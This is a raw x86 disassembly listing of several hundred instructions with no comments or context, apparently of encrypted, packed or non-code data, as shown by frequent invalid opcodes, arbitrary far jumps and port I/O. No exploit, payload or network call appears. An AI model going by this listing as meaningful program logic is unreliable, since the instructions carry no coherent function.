  426fe0:	pusha  
  426fe1:	xchg   esp,eax
  426fe2:	lods   al,BYTE PTR ds:[esi]
  426fe3:	mov    ds:0x38fa1fe6,al
  426fe8:	sub    eax,0x5ee56a94
  426fed:	sahf   
  426fee:	jg     0x426fd5
  426ff0:	test   eax,0x24d5454d
  426ff5:	loop   0x426f7d
  426ff7:	inc    eax
  426ff8:	sub    eax,0x9bb03142
  426ffd:	jmp    0x426fb4
  426fff:	pop    edx
  427000:	rcl    BYTE PTR [ebx],1
  427002:	aaa    
  427003:	adc    DWORD PTR [ecx+edx*4+0x309e3b71],eax
  42700a:	xchg   edx,eax
  42700b:	and    ah,BYTE PTR es:[esi]
  42700e:	pop    esp
  42700f:	push   0xffffffd5
  427011:	not    BYTE PTR [edx-0x2]
  427014:	dec    ecx
  427015:	les    esp,FWORD PTR [ebx]
  427017:	mov    ah,0x48
  427019:	dec    ebx
  42701a:	loope  0x427028
  42701c:	sbb    DWORD PTR [esi+0x2cab1ef4],ebp
  427022:	test   al,0xb0
  427024:	or     BYTE PTR [ebx+edx*2],dl
  427027:	les    ecx,FWORD PTR [eax+edx*4+0x42e83db4]
  42702e:	pop    ds
  42702f:	add    al,0x1
  427031:	rcl    BYTE PTR [ecx+0x26af1ece],1
  427037:	clc    
  427038:	dec    ecx
  427039:	(bad)  
  42703a:	rcr    al,1
  42703c:	hlt    
  42703d:	cmp    al,0x8b
  42703f:	mov    esp,edi
  427041:	dec    edx
  427042:	iret   
  427043:	mov    ebp,0x49e297a7
  427048:	cmp    eax,0x2c5e18a4
  42704d:	pop    esp
  42704e:	xchg   BYTE PTR [ecx-0x7a3b943f],bh
  427054:	inc    esi
  427055:	call   0xda7f:0x93053c75
  42705c:	add    al,BYTE PTR [eax-0x48]
  42705f:	mov    eax,ds:0x62618236
  427064:	mov    BYTE PTR [ebp-0x26],cl
  427067:	rol    dl,1
  427069:	add    cl,ah
  42706b:	or     DWORD PTR [edx+0x3e],ebx
  42706e:	mov    al,0xab
  427070:	les    edx,FWORD PTR [ebp-0xbabd1a7]
  427076:	mov    ebp,0x5e0e6156
  42707b:	dec    ebp
  42707c:	and    BYTE PTR [edx+0x2d],bh
  42707f:	ins    BYTE PTR es:[edi],dx
  427080:	cmp    al,0x58
  427082:	sbb    edx,DWORD PTR [eax+ebp*8]
  427085:	or     edi,eax
  427087:	out    0x82,al
  427089:	jle    0x4270c8
  42708b:	stos   BYTE PTR es:[edi],al
  42708c:	stos   DWORD PTR es:[edi],eax
  42708d:	sbb    cl,bl
  42708f:	or     ebx,DWORD PTR ds:0x395ea66b
  427095:	ds mov eax,0xc3789491
  42709b:	inc    ecx
  42709c:	mov    ch,0x6e
  42709e:	push   0xebe3ded6
  4270a3:	imul   esp,DWORD PTR [edx-0x67957fdd],0x566e8ffe
  4270ad:	push   es
  4270ae:	mov    esp,0x40ca717b
  4270b3:	inc    esp
  4270b4:	sbb    DWORD PTR ds:[edx],ecx
  4270b7:	jb     0x427122
  4270b9:	frstor [ebp-0x7c6b9050]
  4270bf:	xchg   ebx,eax
  4270c0:	fiadd  WORD PTR [eax]
	...
  427132:	add    BYTE PTR [eax],al
  427134:	fwait
  427135:	and    DWORD PTR [edi],ecx
  427137:	popa   
  427138:	mov    edi,0xcefbff6f
  42713d:	aad    0x24
  42713f:	aam    0xa0
  427141:	call   0x1:0x9f3600ef
  427148:	cmc    
  427149:	add    BYTE PTR [eax],al
  42714b:	add    dl,ch
  42714d:	loop   0x427133
  42714f:	pusha  
  427150:	iret   
  427151:	add    eax,esp
  427153:	pushf  
  427154:	dec    esi
  427155:	inc    ecx
  427156:	stos   BYTE PTR es:[edi],al
  427157:	push   ebp
  427158:	ss lods al,BYTE PTR ds:[esi]
  42715b:	xor    bh,ch
  42715d:	xor    eax,0xc7b07608
  427162:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  427163:	daa    
  427164:	xchg   esp,eax
  427165:	push   edi
  427166:	aam    0xbe
  427168:	lods   eax,DWORD PTR ds:[esi]
  427169:	or     eax,0x6f3c5786
  42716e:	pusha  
  42716f:	js     0x427187
  427171:	mov    edi,?
  427173:	jmp    0x4270f9
  427175:	int3   
  427176:	ja     0x4271ae
  427178:	loope  0x427126
  42717a:	mov    edx,0xb6ef4a6e
  42717f:	pop    ss
  427180:	adc    ebx,DWORD PTR [eax+0x6c823244]
  427186:	pop    ebx
  427187:	call   DWORD PTR [edx-0x65a9c4e5]
  42718d:	fs (bad) 
  427190:	add    eax,0xf2d5f42c
  427195:	add    al,0x3b
  427197:	xchg   DWORD PTR [esi+eiz*8+0x4a],ecx
  42719b:	pop    esp
  42719c:	(bad)  [eax]
  42719e:	in     eax,0x93
  4271a0:	pop    ss
  4271a1:	adc    BYTE PTR [edx+0x65829ad6],ch
  4271a7:	fst    QWORD PTR [ebp+0x37ff060]
  4271ad:	push   0x44
  4271af:	adc    edx,ebp
  4271b1:	jle    0x42716c
  4271b3:	adc    esp,DWORD PTR [edi]
  4271b5:	or     al,0xe
  4271b7:	(bad)  
  4271b8:	jmp    0x4271fb
  4271ba:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4271bb:	pusha  
  4271bc:	ds enter 0x56b4,0x5a
  4271c1:	inc    edi
  4271c2:	test   eax,0xc7a374b1
  4271c7:	cmp    edx,eax
  4271c9:	add    BYTE PTR [eax-0x705957b2],ah
  4271cf:	cmp    al,0x5c
  4271d1:	dec    eax
  4271d2:	mov    DWORD PTR [edi-0x78154654],esp
  4271d8:	jge    0x427194
  4271da:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4271db:	push   ss
  4271dc:	push   0xffffff99
  4271de:	stc    
  4271df:	xchg   esp,eax
  4271e0:	ficom  DWORD PTR [edx]
  4271e2:	adc    eax,0x5ed1c852
  4271e7:	push   ebp
  4271e8:	jmp    0x42722b
  4271ea:	ja     0x4271c1
  4271ec:	fs push edx
  4271ee:	xor    al,BYTE PTR [ebx+ebp*8-0x27debb0f]
  4271f5:	xor    al,0x96
  4271f7:	add    ah,ah
  4271f9:	push   eax
  4271fa:	int    0x1d
  4271fc:	mov    ch,0x93
  4271fe:	ss dec ecx
  427200:	cwde   
  427201:	push   edx
  427202:	inc    edx
  427203:	imul   ebp,DWORD PTR [esi+0x3d],0x6f
  427207:	adc    DWORD PTR [edx+0x23],ecx
  42720a:	dec    edx
  42720b:	cmp    dh,0xe4
  42720e:	adc    DWORD PTR [ecx-0x2f],edi
  427211:	inc    ebx
  427212:	arpl   WORD PTR [edx+0x5],cx
  427215:	push   ss
  427216:	cmp    eax,0x540cda0
  42721b:	or     al,0xf3
  42721d:	cmp    al,0xb6
  42721f:	ds inc edx
  427221:	push   ecx
  427222:	mov    ds:0xcd3622b9,eax
  427227:	iret   
  427228:	std    
  427229:	cs rcl ch,0xaf
  42722d:	jmp    0x6611ca7a
  427232:	add    DWORD PTR [eax-0x3879bc86],ebp
  427238:	add    edx,DWORD PTR [esi]
  42723a:	test   DWORD PTR [ecx+0x3],ebp
  42723d:	aad    0xb3
  42723f:	fsubr  DWORD PTR [edx+0x0]
	...
  4272b2:	add    BYTE PTR [eax],al
  4272b4:	push   esp
  4272b5:	and    eax,0xeefd4e8d
  4272ba:	xlat   BYTE PTR ds:[ebx]
  4272bb:	aas    
  4272bc:	jle    0x427280
  4272be:	ds jmp 0xbb8fece7
  4272c4:	sub    esp,DWORD PTR [eax+0xf50001]
  4272ca:	add    BYTE PTR [eax],al
  4272cc:	inc    eax
  4272cd:	cs or  al,0x11
  4272d0:	cdq    
  4272d1:	sbb    ch,al
  4272d3:	test   DWORD PTR [ecx+0x9],ecx
  4272d6:	ins    BYTE PTR es:[edi],dx
  4272d7:	lods   al,BYTE PTR ds:[esi]
  4272d8:	ins    DWORD PTR es:[edi],dx
  4272d9:	cwde   
  4272da:	lock cld 
  4272dc:	push   esi
  4272dd:	clc    
  4272de:	test   eax,0x74d3e1ef
  4272e3:	jmp    0x5193:0xeaaa7830
  4272ea:	aas    
  4272eb:	enter  0xc74d,0x9c
  4272ef:	sbb    dh,BYTE PTR [ebx-0x58]
  4272f2:	popf   
  4272f3:	pusha  
  4272f4:	cli    
  4272f5:	je     0x42736b
  4272f7:	pop    ebx
  4272f8:	hlt    
  4272f9:	xlat   BYTE PTR ds:[ebx]
  4272fa:	cmp    eax,0xb1ed495b
  4272ff:	pop    edx
  427300:	retf   
  427301:	(bad)  
  427302:	push   edx
  427303:	int3   
  427304:	push   esi
  427305:	xor    DWORD PTR [esi+0x7f14b799],eax
  42730b:	cli    
  42730c:	mov    BYTE PTR [edi],bl
  42730e:	pop    edi
  42730f:	sbb    eax,0x317ff38f
  427314:	stos   DWORD PTR es:[edi],eax
  427315:	dec    eax
  427316:	jno    0x427346
  427318:	mov    edi,0xf3b0d512
  42731d:	sub    ebx,DWORD PTR [edx]
  42731f:	loopne 0x427309
  427321:	repz gs adc esp,edx
  427325:	and    DWORD PTR [edi-0x6672ad81],0x3d80ab86
  42732f:	or     bl,BYTE PTR ds:0xc9ec1d8f
  427335:	addr16 inc esp
  427337:	stos   DWORD PTR es:[edi],eax
  427338:	js     0x4272d7
  42733a:	out    0xed,al
  42733c:	dec    eax
  42733d:	push   ebp
  42733e:	jg     0x42738b
  427340:	cmp    al,BYTE PTR [edi-0x52]
  427343:	loopne 0x427323
  427345:	push   ebx
  427346:	mov    edi,DWORD PTR [eax-0x13]
  427349:	or     esp,DWORD PTR [ebx-0x5b]
  42734c:	lods   al,BYTE PTR ds:[esi]
  42734d:	fcom   st(5)
  42734f:	ret    
  427350:	jo     0x4272fb
  427352:	push   esi
  427353:	mov    BYTE PTR es:[edi-0x63204ccd],dl
  42735a:	jmp    0x76f8:0x33156c27
  427361:	sub    al,BYTE PTR [ebp+eax*4-0x29907eaf]
  427368:	(bad)  
  42736a:	sbb    BYTE PTR [esi-0x57],ch
  42736d:	(bad)  
  42736e:	pop    ebp
  42736f:	scas   al,BYTE PTR es:[edi]
  427370:	shl    DWORD PTR [ebp+0x195ff2ad],1
  427376:	sub    ah,BYTE PTR [esi+0x2da8a28c]
  42737c:	fdivp  st(5),st
  42737e:	push   cs
  42737f:	imul   esi,DWORD PTR [ebx],0x24
  427382:	mov    gs,WORD PTR [ebp+0x6c]
  427385:	add    DWORD PTR [ebx],esi
  427387:	pop    ds
  427388:	not    DWORD PTR [esi]
  42738a:	mov    ah,0x85
  42738c:	add    eax,0xf5de1ede
  427391:	outs   dx,BYTE PTR ds:[esi]
  427392:	jg     0x4273db
  427394:	push   ebx
  427395:	rep outs dx,BYTE PTR ds:[esi]
  427397:	out    dx,al
  427398:	sub    al,0x53
  42739a:	jne    0x427331
  42739c:	jle    0x427343
  42739e:	inc    esi
  42739f:	popf   
  4273a0:	xchg   edi,eax
  4273a1:	in     al,0xb0
  4273a3:	cmp    ah,ah
  4273a5:	mov    esp,0xb00f55ae
  4273aa:	mov    cl,0xe3
  4273ac:	call   0x1c71:0x5d85f590
  4273b3:	mov    bh,0x71
  4273b5:	mov    dl,0xdc
  4273b7:	sar    DWORD PTR [eax+0xe],1
  4273ba:	aas    
  4273bb:	mov    ah,BYTE PTR [esi+ecx*8+0x5b5110]
	...
  427432:	add    BYTE PTR [eax],al
  427434:	imul   ebp,DWORD PTR [edi-0x78],0xe9ef8e08
  42743b:	outs   dx,DWORD PTR ds:[esi]
  42743c:	pop    DWORD PTR [ebx+eiz*8-0x16]
  427440:	sub    dl,BYTE PTR [eax-0x5edf3bfd]
  427446:	add    DWORD PTR [eax],eax
  427448:	cmc    
  427449:	add    BYTE PTR [eax],al
  42744b:	add    bl,al
  42744d:	pop    ebx
  42744e:	inc    ebx
  42744f:	daa    
  427450:	inc    eax
  427451:	xchg   ebp,eax
  427452:	mov    dl,0xe2
  427454:	sub    eax,0x5501ac78
  427459:	push   ebx
  42745a:	mov    edx,0xf63bc308
  42745f:	fiadd  WORD PTR ds:0xfa3b2563
  427465:	(bad)  
  427466:	(bad)
  427469:	leave  
  42746a:	push   esi
  42746b:	adc    BYTE PTR [ecx+edi*8+0xbe37fa0],0xd3
  427473:	sar    DWORD PTR [edi],0x77
  427476:	xchg   BYTE PTR [edi-0x4a],al
  427479:	jo     0x427497
  42747b:	mov    bh,0xcc
  42747d:	inc    esp
  42747e:	cmp    esp,ebp
  427480:	push   esi
  427481:	xchg   ebp,eax
  427482:	push   edi
  427483:	retf   
  427484:	int    0x5a
  427486:	iret   
  427487:	mov    ds:0x217f43fe,al
  42748c:	(bad)  
  42748d:	je     0x42742d
  42748f:	dec    ebx
  427490:	inc    eax
  427491:	sub    edi,DWORD PTR [ecx+0x2bdfc598]
  427497:	daa    
  427498:	push   ebp
  427499:	test   DWORD PTR [edx-0x78cd3c54],edi
  42749f:	into   
  4274a0:	int    0x29
  4274a2:	and    ah,al
  4274a4:	shl    BYTE PTR [edx-0x1dcc46e9],0x17
  4274ab:	jecxz  0x4274ec
  4274ad:	int3   
  4274ae:	data16 sahf 
  4274b0:	repnz pop ebp
  4274b2:	or     esp,esp
  4274b4:	ret    
  4274b5:	aas    
  4274b6:	(bad)  
  4274b7:	sbb    al,0x65
  4274b9:	push   eax
  4274ba:	stc    
  4274bb:	push   ebx
  4274bc:	mov    al,ds:0xa87fd84
  4274c1:	jecxz  0x42746f
  4274c3:	(bad)  
  4274c4:	inc    edx
  4274c5:	repz xchg ebp,eax
  4274c7:	test   DWORD PTR [ecx+ebp*8-0x61],0x7f2c23ec
  4274cf:	jg     0x427464
  4274d1:	and    DWORD PTR [eax],0x49
  4274d4:	in     al,0xe0
  4274d6:	imul   edi,esi,0xa1a872c2
  4274dc:	ret    
  4274dd:	ja     0x42752b
  4274df:	int    0xef
  4274e1:	outs   dx,DWORD PTR ds:[esi]
  4274e2:	fst    QWORD PTR [esp+edi*1]
  4274e5:	dec    edi
  4274e6:	neg    edi
  4274e8:	ja     0x4274ae
  4274ea:	js     0x427520
  4274ec:	add    edi,ecx
  4274ee:	aas    
  4274ef:	(bad)  
  4274f0:	cmp    ebp,DWORD PTR [ecx]
  4274f2:	bnd ret 
  4274f4:	mov    bh,0x4f
  4274f6:	sub    BYTE PTR [ebp+0x19],bh
  4274f9:	outs   dx,BYTE PTR ds:[esi]
  4274fa:	fcomp  QWORD PTR [ebx]
  4274fc:	(bad)  
  4274fd:	sub    eax,0xf0c6952e
  427502:	inc    esi
  427503:	ja     0x427491
  427505:	mov    ebx,0x5ee458e7
  42750a:	popf   
  42750b:	fimul  DWORD PTR [edi-0x61]
  42750e:	pop    ss
  42750f:	fld    TBYTE PTR [edi]
  427511:	xor    DWORD PTR [edx+eax*4-0x65],0x4
  427516:	ins    BYTE PTR es:[edi],dx
  427517:	outs   dx,DWORD PTR ds:[esi]
  427518:	add    eax,0x829cbc05
  42751d:	test   eax,0x6d9839aa
  427522:	adc    eax,0xc6e6605c
  427527:	arpl   WORD PTR [edi],ax
  427529:	std    
  42752a:	enter  0xdc56,0x8e
  42752e:	jmp    0x427576
  427530:	ins    DWORD PTR es:[edi],dx
  427531:	push   cs
  427532:	sbb    DWORD PTR [edi-0x252d114b],edx
  427538:	stc    
  427539:	int    0xa5
  42753b:	jmp    0xb8c3298d
  427540:	sub    al,0x0
	...
  4275b2:	add    BYTE PTR [eax],al
  4275b4:	adc    cl,bl
  4275b6:	sbb    DWORD PTR [edx],0xcb9b5ad9
  4275bc:	mov    ds:0xe09a8b87,al
  4275c1:	data16 jnp 0x4275e1
  4275c4:	adc    eax,0xf50001a2
  4275c9:	add    BYTE PTR [eax],al
  4275cb:	add    BYTE PTR [ecx+eax*4+0x26],ch
  4275cf:	xor    al,0xa
  4275d1:	fsubr  DWORD PTR [edx+0x6e]
  4275d4:	push   0xffffffd9
  4275d6:	sbb    DWORD PTR [ebp-0x55],esi
  4275d9:	xor    eax,DWORD PTR [eax+0x1b]
  4275dc:	cmp    DWORD PTR [ebx-0x4],ecx
  4275df:	ins    DWORD PTR es:[edi],dx
  4275e0:	push   ebp
  4275e1:	adc    BYTE PTR [esi+0x35],0x9c
  4275e5:	xor    BYTE PTR [esi],al
  4275e7:	shl    BYTE PTR [esi-0x537e893],0xba
  4275ee:	aad    0xcc
  4275f0:	xor    BYTE PTR [eax+0x14],cl
  4275f3:	or     DWORD PTR [eax*4-0x29653649],eax
  4275fa:	jne    0x4275fc
  4275fc:	jmp    0x7ec4:0xfeadf162
  427603:	sbb    dl,ah
  427605:	or     ah,BYTE PTR [esi]
  427607:	jmp    0x24f153d6
  42760c:	mov    ch,0xe1
  42760e:	pop    eax
  42760f:	push   edi
  427610:	add    al,0xfc
  427612:	push   esp
  427613:	shl    DWORD PTR [edx+ebp*2-0x7b33b1dc],cl
  42761a:	adc    eax,0x4c21a176
  42761f:	dec    ebx
  427620:	or     eax,0x51867ae9
  427625:	icebp  
  427626:	out    dx,eax
  427627:	daa    
  427628:	out    0x5,eax
  42762a:	push   ebx
  42762b:	push   ebx
  42762c:	add    edi,ebp
  42762e:	mov    al,ds:0x8874cb5a
  427633:	sbb    al,0x54
  427635:	retf   
  427636:	dec    esi
  427637:	or     esi,DWORD PTR [ebx]
  427639:	pop    ebp
  42763a:	add    dh,bh
  42763c:	cld    
  42763d:	and    dh,BYTE PTR [edx-0x10]
  427640:	cmc    
  427641:	xor    cl,BYTE PTR [eax]
  427643:	dec    esi
  427644:	inc    eax
  427645:	mov    ebx,0x41c3eeca
  42764a:	mov    eax,0x1b5a1f62
  42764f:	mov    ecx,0x17fb525d
  427654:	test   eax,0xfb7b9334
  427659:	or     DWORD PTR [ebp+0x4c02b1c4],0xc801a909
  427663:	out    0x28,al
  427665:	rol    ch,cl
  427667:	pop    ecx
  427668:	cs in  al,0x7b
  42766b:	add    ebp,edx
  42766d:	mov    bh,ah
  42766f:	(bad)  
  427670:	int3   
  427671:	jno    0x427670
  427673:	adc    BYTE PTR [edx+0x3775199],bl
  427679:	dec    edx
  42767a:	data16 cmp ch,dl
  42767d:	cs and dl,dh
  427680:	into   
  427681:	jmp    0x427649
  427683:	or     DWORD PTR [ecx+0x7a],ecx
  427686:	xor    bh,BYTE PTR [edi]
  427688:	add    bh,BYTE PTR [ebx-0x35]
  42768b:	mov    ebx,es
  42768d:	adc    DWORD PTR [ebx],esi
  42768f:	sti    
  427690:	test   al,0x27
  427692:	pop    ds
  427693:	jp     0x427703
  427695:	sti    
  427696:	fcomp  QWORD PTR [eax+0x4fdc0b9]
  42769c:	xor    ecx,edi
  42769e:	add    BYTE PTR [ecx-0x11],ah
  4276a1:	pop    es
  4276a2:	push   edi
  4276a3:	add    dl,dl
  4276a5:	cmc    
  4276a6:	callw  0x356e
  4276aa:	sub    DWORD PTR [ecx-0x79],ebp
  4276ad:	int    0x51
  4276af:	ds nop
  4276b1:	mov    bl,0x8f
  4276b3:	in     al,0x93
  4276b5:	stc    
  4276b6:	jecxz  0x427729
  4276b8:	sub    eax,0x651d38af
  4276bd:	add    dl,bh
  4276bf:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4276c0:	pop    ebp
	...
  427731:	add    BYTE PTR [eax],al
  427733:	add    BYTE PTR [eax-0xd53173],bh
  427739:	imul   edi,esp,0xffffff9f
  42773c:	and    al,0x37
  42773e:	or     al,0x49
  427740:	jg     0x4276f0
  427742:	xchg   DWORD PTR [ecx+0x1a30a],ebx
  427748:	cmc    
  427749:	add    BYTE PTR [eax],al
  42774b:	add    BYTE PTR [edx],dh
  42774d:	mov    BYTE PTR [esp+ebp*2],0x38
  427751:	lods   eax,DWORD PTR ds:[esi]
  427752:	xchg   BYTE PTR [ebp+eax*8-0x6],dh
  427756:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  427757:	sub    bh,BYTE PTR [ebp-0x63]
  42775a:	mov    eax,ds:0xa6063c38
  42775f:	lods   al,BYTE PTR ds:[esi]
  427760:	jmp    0xae6e974d
  427765:	(bad)  
  427767:	popf   
  427768:	dec    edi
  427769:	in     al,0xe7
  42776b:	cmp    DWORD PTR [ecx],esp
  42776d:	outs   dx,BYTE PTR ds:[esi]
  42776e:	push   esi
  42776f:	outs   dx,DWORD PTR ds:[esi]
  427770:	pushf  
  427771:	into   
  427772:	pop    eax
  427773:	add    al,0x72
  427775:	lods   al,BYTE PTR ds:[esi]
  427776:	sub    al,0xaf
  427778:	pop    ss
  427779:	std    
  42777a:	fbstp  TBYTE PTR [edx+ebx*2+0x6a]
  42777e:	gs dec eax
  427780:	fwait
  427781:	adc    eax,0xa2f864a8
  427786:	out    0x39,al
  427788:	outs   dx,DWORD PTR ds:[esi]
  427789:	cwde   
  42778a:	add    eax,0xf49883a8
  42778f:	sub    eax,0xbf36343b
  427794:	hlt    
  427795:	push   ebp
  427796:	data16 fwait
  427798:	std    
  427799:	adc    BYTE PTR [edi-0x5f9ccedf],bl
  42779f:	inc    edx
  4277a0:	pop    edi
  4277a1:	inc    edx
  4277a2:	xor    DWORD PTR ds:0x7b6b30bf,ecx
  4277a8:	sbb    esp,DWORD PTR [ebx+eax*2+0x60]
  4277ac:	(bad)  
  4277ad:	in     al,0xe3
  4277af:	inc    esi
  4277b0:	mov    eax,0x33696f73
  4277b5:	out    0x1c,eax
  4277b7:	jmp    0x8787c75e
  4277bc:	stos   BYTE PTR es:[edi],al
  4277bd:	xchg   DWORD PTR [ebp-0x2b],esi
  4277c0:	mov    eax,0x9fdc26e
  4277c5:	xchg   edx,eax
  4277c6:	dec    ecx
  4277c7:	je     0x42775f
  4277c9:	cmp    dh,dl
  4277cb:	dec    esi
  4277cc:	mov    eax,es:0xf113cc22
  4277d2:	mov    ds:0xc5748e98,eax
  4277d7:	(bad)  
  4277d8:	sub    ebx,DWORD PTR [eax]
  4277da:	fdivr  DWORD PTR [ecx-0x4]
  4277dd:	into   
  4277de:	movsx  esi,dl
  4277e1:	pushw  ds
  4277e3:	dec    edi
  4277e4:	jecxz  0x4277aa
  4277e6:	shl    BYTE PTR [ecx],0xba
  4277e9:	inc    ebp
  4277ea:	and    bl,BYTE PTR [ecx+0x59cfb6f5]
  4277f0:	cmp    BYTE PTR [eax-0x55],al
  4277f3:	jmp    0xf3ce:0xb6e2b6bf
  4277fa:	retf   
  4277fb:	xor    eax,0xbf0e4526
  427800:	or     DWORD PTR [ebp+0x45],0xbbe5dc15
  427807:	enter  0x5632,0xc3
  42780b:	mov    BYTE PTR [ecx-0x5b],cl
  42780e:	icebp  
  42780f:	or     BYTE PTR [esi-0x6a],bl
  427812:	mov    DWORD PTR [eax],0xba0fcd06
  427818:	(bad)  
  427819:	fadd   st,st(2)
  42781b:	sbb    ebp,esi
  42781d:	jo     0x42780e
  42781f:	dec    edx
  427820:	mov    WORD PTR [ebp+0x17fcdc15],?
  427826:	shl    BYTE PTR [ebx],cl
  427828:	data16 rol BYTE PTR [edx],0xb2
  42782c:	ror    DWORD PTR [ecx],0x93
  42782f:	call   0x8e1f45cb
  427834:	call   0x7cb7f8a0
  427839:	cmp    eax,0xe652794b
  42783e:	inc    esp
  42783f:	jne    0x42780c
	...
  4278b1:	add    BYTE PTR [eax],al
  4278b3:	add    BYTE PTR [esi+ecx*2+0x7fff7d7d],cl
  4278ba:	mov    edi,?
  4278bc:	dec    eax
  4278bd:	mov    ds:0xb20e918f,al
  4278c2:	xor    al,bl
  4278c4:	jmp    DWORD PTR [ebx+0xf50001]
  4278ca:	add    BYTE PTR [eax],al
  4278cc:	in     al,0x54
  4278ce:	adc    edx,ebx
  4278d0:	xchg   DWORD PTR [ecx+0x4802e0f7],ebp
  4278d6:	xchg   esp,eax
  4278d7:	cwde   
  4278d8:	repz inc edi
  4278da:	xor    esi,ebx
  4278dc:	or     DWORD PTR [edx],edx
  4278de:	(bad)  
  4278df:	loop   0x42791b
  4278e1:	lods   eax,DWORD PTR ds:[esi]
  4278e2:	cmp    eax,0x322e1bd9
  4278e7:	mov    eax,ds:0x73fd9586
  4278ec:	into   
  4278ed:	xlat   BYTE PTR ds:[ebx]
  4278ee:	pop    ecx
  4278ef:	xor    al,0x29
  4278f1:	cmp    eax,0xfba5f2c3
  4278f6:	adc    eax,0xdb70696d
  4278fb:	data16 sbb bh,ch
  4278fe:	or     al,0xba
  427900:	aas    
  427901:	fadd   DWORD PTR [eax-0x5061fe32]
  427907:	mov    edx,0x9e5461b
  42790c:	jo     0x4278a4
  42790e:	test   DWORD PTR [ebx+0x59],ebp
  427911:	inc    edx
  427912:	sub    DWORD PTR [eax+0x626db553],ebx
  427918:	lods   eax,DWORD PTR ds:[esi]
  427919:	(bad)  
  42791a:	xchg   BYTE PTR [ecx-0x39],ch
  42791d:	out    dx,eax
  42791e:	xor    BYTE PTR [ebp+0x2ca86b45],0x1d
  427925:	mov    BYTE PTR [ecx-0x58365e4],bl
  42792b:	xchg   DWORD PTR [esi+0x2d576add],edi
  427931:	daa    
  427932:	scas   al,BYTE PTR es:[edi]
  427933:	pop    ebx
  427934:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  427935:	sub    edx,DWORD PTR [esi]
  427937:	dec    esp
  427938:	call   edi
  42793a:	mov    DWORD PTR [ecx+0x1b7bf503],esi
  427940:	mov    eax,ds:0xdfca68a3
  427945:	nop
  427946:	inc    eax
  427947:	clc    
  427948:	sub    DWORD PTR [ebp+0x27],ebx
  42794b:	addr16 add eax,0xcb27cd00
  427951:	or     eax,0xac97f599
  427956:	int    0x7c
  427958:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  427959:	jge    0x4279c2
  42795b:	or     eax,0xdba28abc
  427960:	loope  0x427965
  427962:	jbe    0x4279cd
  427964:	(bad)  [ecx-0x3b]
  427967:	jnp    0x427982
  427969:	cmp    al,0x73
  42796b:	pop    edx
  42796c:	or     ecx,DWORD PTR [ebx-0x4897cd30]
  427972:	sub    eax,0x801cf7c4
  427977:	int    0x4e
  427979:	xchg   DWORD PTR [esi-0x14],edx
  42797c:	xchg   edi,eax
  42797d:	in     eax,0x72
  42797f:	dec    ecx
  427980:	std    
  427981:	cli    
  427982:	div    DWORD PTR [eax]
  427984:	retf   
  427985:	pop    ss
  427986:	fidivr WORD PTR [eax-0x258dcc94]
  42798c:	mov    cl,0x60
  42798e:	enter  0xa2e1,0x4b
  427992:	mov    edx,0x8d73a0d
  427997:	push   0xf7d2bf8e
  42799c:	jnp    0x4279d1
  42799e:	out    dx,al
  42799f:	xchg   DWORD PTR [edi],ebp
  4279a1:	loop   0x427a0f
  4279a3:	and    ebx,DWORD PTR [edi-0x19]
  4279a6:	sub    al,0x26
  4279a8:	rcr    eax,cl
  4279aa:	fsub   DWORD PTR [edi+0x1f5454be]
  4279b0:	mov    fs,WORD PTR [esi]
  4279b2:	pop    ebx
  4279b3:	cs mov dh,0x6f
  4279b6:	mov    eax,fs:0x8d926e04
  4279bc:	scas   eax,DWORD PTR es:[edi]
  4279bd:	mov    cl,0x29
  4279bf:	dec    ebp
  4279c0:	xchg   ebx,eax
	...
  427a31:	add    BYTE PTR [eax],al
  427a33:	add    BYTE PTR [ecx-0x42a9f2d8],bl
  427a39:	ja     0x427a16
  427a3b:	out    dx,eax
  427a3c:	das    
  427a3d:	mov    ch,0xeb
  427a3f:	aam    0x84
  427a41:	in     eax,dx
  427a42:	xchg   esi,eax
  427a43:	sbb    esi,esp
  427a45:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  427a46:	add    DWORD PTR [eax],eax
  427a48:	cmc    
  427a49:	add    BYTE PTR [eax],al
  427a4b:	add    BYTE PTR [edi-0x7a714049],bl
  427a51:	mov    cl,0xc3
  427a53:	jns    0x427ab6
  427a55:	add    BYTE PTR [eax-0x48],ch
  427a58:	fadd   st,st(4)
  427a5a:	sub    esi,DWORD PTR [ecx+0x5ef8b6cb]
  427a60:	mov    ecx,0x71e326f3
  427a65:	retf   
  427a66:	xchg   esp,eax
  427a67:	mov    eax,0xc5491445
  427a6c:	addr16 dec ebp
  427a6e:	mov    dh,0x2f
  427a70:	shl    esp,cl
  427a72:	mov    edx,0x318de4e7
  427a77:	pop    eax
  427a78:	imul   BYTE PTR [edx-0x16528c1d]
  427a7e:	and    ebp,DWORD PTR [eax+ebx*2+0x2a]
  427a82:	and    eax,0x9bd48d3f
  427a87:	fcmovu st,st(7)
  427a89:	lahf   
  427a8a:	aas    
  427a8b:	mov    eax,ds:0xb492bd5f
  427a90:	or     al,0xfb
  427a92:	pop    eax
  427a93:	fsub   QWORD PTR [eax+esi*2]
  427a96:	cmp    BYTE PTR [edi],al
  427a98:	rcr    BYTE PTR [edx+edi*2],cl
  427a9b:	mov    dh,0xa0
  427a9d:	mov    edi,0x8a86079e
  427aa2:	mov    DWORD PTR [ecx-0x14],edx
  427aa5:	les    ebx,FWORD PTR [ecx]
  427aa7:	imul   ecx,DWORD PTR [edi+0x18],0xfffffff0
  427aab:	inc    ebp
  427aac:	ss cdq 
  427aae:	jae    0x427a41
  427ab0:	dec    esi
  427ab1:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  427ab2:	xchg   edx,eax
  427ab3:	push   ebp
  427ab4:	stos   DWORD PTR es:[edi],eax
  427ab5:	stos   BYTE PTR es:[edi],al
  427ab6:	retf   
  427ab7:	mov    ebx,0x678bb05a
  427abc:	in     al,0xfa
  427abe:	daa    
  427abf:	clc    
  427ac0:	hlt    
  427ac1:	jp     0x427aa2
  427ac3:	sbb    ebx,esp
  427ac5:	push   0x63b47c88
  427aca:	pop    ss
  427acb:	cmp    DWORD PTR [edi-0x2],eax
  427ace:	lods   al,BYTE PTR ds:[esi]
  427acf:	mov    ah,0x78
  427ad1:	dec    DWORD PTR [edi+0x61]
  427ad4:	mov    dh,0xe1
  427ad6:	and    esp,esi
  427ad8:	scas   eax,DWORD PTR es:[edi]
